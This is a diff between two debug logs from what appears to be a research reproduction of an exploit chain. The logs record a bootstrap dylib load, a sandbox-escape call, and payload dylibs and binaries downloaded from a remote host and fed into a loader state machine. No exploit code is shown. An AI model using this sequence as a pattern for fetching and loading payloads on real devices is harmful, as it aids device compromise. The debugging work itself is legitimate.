@@ -28,12 +28,12 @@ resolveUrl => http://100.115.29.116:8000/
 [PATCH] Loaded bootstrap.dylib: 89328B, oA=44664 (orig 45056), _process=0x68d8
 [NATIVE] g.SA encoded words=60550
 [PATCH] _process at original offset 0x68d8, no redirect needed
-dylib load address: 0xc52638000
-data address?: 0x30a4bc000
+dylib load address: 0xc52a74000
+data address?: 0x30a416000
 dylib size: 0x121104
 [NATIVE] calling sandboxEscape.Ad
 [NATIVE] sandboxEscape.Ad returned
-[NATIVE] caller target T=0xc5264dcf4
+[NATIVE] caller target T=0xc52a89cf4
 [NATIVE] caller.jd returned=0
 [NATIVE] native trampoline returned=0
 [STATE] start loop
@@ -44,9 +44,9 @@ dylib size: 0x121104
 [HTTP] 200 GET /payloads/7a7d99099b035b2c6512b6ebeeea6df1ede70fbb/raw.bin -> /home/jurre/Documents/coruna-duy-compile/payloads/7a7d99099b035b2c6512b6ebeeea6df1ede70fbb/raw.bin
 [HTTP] 200 GET /payloads/7a1cef00016b950be42f5288ead21fa6fccc3107/entry0_type0x08.dylib -> /home/jurre/Documents/coruna-duy-compile/payloads/7a1cef00016b950be42f5288ead21fa6fccc3107/entry0_type0x08.dylib
 [HTTP] 200 GET /payloads/7a1cef00016b950be42f5288ead21fa6fccc3107/entry1_type0x09.dylib -> /home/jurre/Documents/coruna-duy-compile/payloads/7a1cef00016b950be42f5288ead21fa6fccc3107/entry1_type0x09.dylib
+[HTTP] 200 GET /payloads/7a1cef00016b950be42f5288ead21fa6fccc3107/entry2_type0x0f.dylib -> /home/jurre/Documents/coruna-duy-compile/payloads/7a1cef00016b950be42f5288ead21fa6fccc3107/entry2_type0x0f.dylib
 [HTTP] 200 GET /payloads/7a1cef00016b950be42f5288ead21fa6fccc3107/entry3_type0x07.bin -> /home/jurre/Documents/coruna-duy-compile/payloads/7a1cef00016b950be42f5288ead21fa6fccc3107/entry3_type0x07.bin
 [HTTP] 200 GET /payloads/7a1cef00016b950be42f5288ead21fa6fccc3107/entry4_type0x07.bin -> /home/jurre/Documents/coruna-duy-compile/payloads/7a1cef00016b950be42f5288ead21fa6fccc3107/entry4_type0x07.bin
-[HTTP] 200 GET /payloads/7a1cef00016b950be42f5288ead21fa6fccc3107/entry2_type0x0f.dylib -> /home/jurre/Documents/coruna-duy-compile/payloads/7a1cef00016b950be42f5288ead21fa6fccc3107/entry2_type0x0f.dylib
 [STATE] D0 UNKNOWN(null) -> wA
 [LOADER] Loading payload: 7a7d99099b035b2c6512b6ebeeea6df1ede70fbb
 Downloading payloads/manifest.json
@@ -54,8 +54,7 @@ Downloading payloads/manifest.json
 Downloading payloads/7a7d99099b035b2c6512b6ebeeea6df1ede70fbb/raw.bin
 [STATE] feedRawBuffer -> BA, len=2192
 [LOADER] Fed 2192 bytes for 7a7d99099b035b2c6512b6ebeeea6df1ede70fbb
-[STATE] D0 QA -> BA
-[STATE] regs BA D1=1886680168 D2=825175866 D3=825110576 D4=841889073
+[STATE] D0 QA -> wA
 [LOADER] Loading payload: 7a1cef00016b950be42f5288ead21fa6fccc3107
 Downloading payloads/7a1cef00016b950be42f5288ead21fa6fccc3107/entry0_type0x08.dylib
 Downloading payloads/7a1cef00016b950be42f5288ead21fa6fccc3107/entry1_type0x09.dylib
@@ -64,43 +63,29 @@ Downloading payloads/7a1cef00016b950be42f5288ead21fa6fccc3107/entry1_type0x09.dy
 Downloading payloads/7a1cef00016b950be42f5288ead21fa6fccc3107/entry2_type0x0f.dylib
 Downloading payloads/7a1cef00016b950be42f5288ead21fa6fccc3107/entry3_type0x07.bin
 Downloading payloads/7a1cef00016b950be42f5288ead21fa6fccc3107/entry4_type0x07.bin
-[STATE] D0 BA -> QA
+[STATE] D0 wA -> QA
 [HTTP] 200 GET /4817ea8063eb4480e915f1a4479c62ec774f52ce.min.js -> /home/jurre/Documents/coruna-duy-compile/4817ea8063eb4480e915f1a4479c62ec774f52ce.min.js
-[LOADER] Built F00DBEEF container: 5 entries, 701021 bytes
-[STATE] feedRawBuffer -> BA, len=701021
-[LOADER] Fed 701021 bytes for 7a1cef00016b950be42f5288ead21fa6fccc3107
+[LOADER] Built F00DBEEF container: 5 entries, 700989 bytes
+[STATE] feedRawBuffer -> BA, len=700989
+[LOADER] Fed 700989 bytes for 7a1cef00016b950be42f5288ead21fa6fccc3107
 [STATE] D0 QA -> IA
-[STATE] regs IA D1=701021 D2=4027432687 D3=5 D4=524288
-[STATE] IA pending raw="]²\n"
+[STATE] regs IA D1=700989 D2=4027432687 D3=5 D4=524288
+[STATE] IA pending raw="=²\n"
 [STATE] IA fallback fetch 4817ea8063eb4480e915f1a4479c62ec774f52ce.min.js
 Downloading 4817ea8063eb4480e915f1a4479c62ec774f52ce.min.js
 [STATE] feedRawBuffer -> BA, len=232632
 [LOADER] IA fallback fed 232632 bytes from 4817ea8063eb4480e915f1a4479c62ec774f52ce.min.js
 [STATE] D0 IA -> BA
 [STATE] regs BA D1=232632 D2=3350529175 D3=3762681624 D4=4114624914
-[STATE] BA watchdog -> EA
 [STATE] D0 BA -> EA
 [STATE] EA recovery -> wA
 [STATE] wA pending raw="¸\u0003" bytes=[184,140] D2=3350529175
 [STATE] wA invalid -> UA
 [STATE] D0 EA -> UA
 [STATE] UA nudge -> QA (M="¸\u0003" I="")
-[STATE] QA fastpath -> wA
-[STATE] D0 UA -> wA
-[STATE] wA invalid repeat -> UA
-[STATE] D0 wA -> UA
-[STATE] UA waiting D2=3350529175 raw="¸\u0003"
+[STATE] D0 EA -> UA
 [STATE] UA nudge -> QA (M="¸\u0003" I="")
 [STATE] QA fastpath -> wA
 [STATE] D0 UA -> wA
 [STATE] wA invalid repeat -> UA
 [STATE] D0 wA -> UA
-[STATE] UA waiting D2=3350529175 raw="¸\u0003"
-[STATE] UA waiting D2=3350529175 raw="¸\u0003"
-[STATE] UA nudge -> QA (M="¸\u0003" I="")
-[STATE] QA fastpath -> wA
-[STATE] D0 UA -> wA
-[STATE] wA invalid repeat -> UA
-[STATE] D0 wA -> UA
-[STATE] UA waiting D2=3350529175 raw="¸\u0003"
-[STATE] D0 UA -> EA
